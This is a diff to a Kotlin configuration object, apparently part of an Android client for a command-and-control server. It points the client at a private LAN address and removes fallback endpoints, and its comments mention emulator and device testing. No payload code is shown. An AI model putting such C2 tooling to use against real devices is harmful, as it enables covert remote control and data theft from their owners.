@@ -14,29 +14,23 @@ object C2Config {
      * For emulator testing, use 10.0.2.2 which points to the host machine's loopback interface.
      * For physical device testing, use the actual IP address of your C2 server.
      */
-    const val SERVER_URL = "https://10.0.2.2:42069"
+    const val SERVER_URL = "http://192.168.0.109:42069"
     
     /**
      * Alternative HTTP URL to try if HTTPS fails
      */
-    const val HTTP_SERVER_URL = "http://10.0.2.2:42069"
+    const val HTTP_SERVER_URL = "http://192.168.0.109:42069"
     
     /**
      * Local testing URL (when using local network or direct connection)
      * For IP connecting to the computer running the C2 server
      */
-    const val LOCAL_SERVER_URL = "http://127.0.0.1:42069"
+    const val LOCAL_SERVER_URL = "http://192.168.0.109:42069"
     
     /**
      * Additional fallback URLs for testing - These will be tried if the primary URLs fail
      * You can modify these to match your specific network configuration
      */
-    val FALLBACK_URLS = listOf(
-        "http://localhost:42069",
-        "http://192.168.1.100:42069",  // Common LAN IP - modify as needed
-        "http://172.17.0.1:42069"      // Common Docker host IP - modify as needed
-    )
-    
     /**
      * Endpoints for various C2 server functionalities
      */
